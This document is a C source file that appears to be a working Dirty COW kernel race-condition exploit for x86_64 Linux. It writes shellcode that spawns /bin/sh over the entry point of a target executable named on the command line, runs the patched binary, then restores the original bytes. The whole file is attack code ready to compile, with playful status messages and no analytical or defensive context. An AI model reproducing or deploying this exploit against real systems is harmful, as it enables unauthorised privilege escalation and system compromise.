#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/uio.h>
#include <sys/wait.h>

void *map;

char *name;
int die = 0;
int success = 0;
long offset;
long page_x;

#ifdef __x86_64__
#define SHELL_SIZE 40
#define BASE_OFF 0x400000
char orig_buf[SHELL_SIZE];
char shelcode[SHELL_SIZE] = "H1\xffH\x89\xfeH\x89\xfajuX\x0f\x05VH\xbb/bin//shSH\x89\xe7H\x89\xf2j;X\x0f\x05\x90\x90\x90";
#else
#error "unsuported"
#endif

char *write_ptr = shelcode;
char *orig_ptr  = orig_buf;

void *trigger(void *arg)
{

  int i,c=0;
  for(i=0;i<100000000 && !die ;i++)
  {
    c+=madvise(map,offset+SHELL_SIZE,MADV_DONTNEED);
    if(die) break;
  }
  //  printf("madvise %d\n",c);
}
 
void *overwrite(void *arg)
{
  
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000 && !die;i++) {
    lseek(f,(long)map+offset,SEEK_SET);
    c+=write(f,write_ptr,SHELL_SIZE);
  }
  //  printf("procselfmem %d\n", c);
}
 
void * checker(void *arg){
  
  int i,f;
  char buf[SHELL_SIZE];
  for(i=0;i<100000000;i++) {
    f=open(name,O_RDONLY);
    lseek(f,offset+page_x,SEEK_SET);
    memset(buf,0,SHELL_SIZE);
    read(f,buf,SHELL_SIZE);
    close(f);
    
    if(memcmp(buf,orig_ptr,SHELL_SIZE)){
      die=1;
      success=1;
      break;
    }
  }
}
void worker(char *p0,char *p1){
  pthread_t pth1,pth2,pth3;

  write_ptr = p0;
  orig_ptr  = p1;

  int f=open(name,O_RDONLY);
  map=mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,f,page_x);

  
  pthread_create(&pth2,NULL,overwrite,NULL);
  
  pthread_create(&pth1,NULL,trigger,NULL);
  pthread_create(&pth3,NULL,checker,NULL);

  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  pthread_join(pth3,NULL);
  munmap(map,0x1000); 
  close(f);
}

int main(int argc,char *argv[])
{
  int type = 0,f;
   
  if (argc<2)return 1;
  name = argv[1];
     
  f=open(name,O_RDONLY);
  lseek(f,0x10,0);
  read(f,&type,2);

  lseek(f,0x18,0);
  read(f,&offset,8);
  if(type == 2)   offset -= BASE_OFF;
  
  lseek(f,offset,0);
  read(f,orig_buf,sizeof(orig_buf));
  close(f);
  
  page_x = offset & ~0xfff;
  offset -= page_x;
//  printf("%llx %llx\n",page_x,offset);
  puts("[*] let make some c0ws dirty");
       
  worker(shelcode,orig_buf);
  if(success) {
    puts("[+] ok we have some dirty things going on");
    if(!fork()) { 
      execve(argv[1],0,0);
    }
    wait(NULL);
    puts("[*] let's clean up...");
    die = 0;
    worker(orig_buf,shelcode);
    
  }
	 		 
  return 0;
}
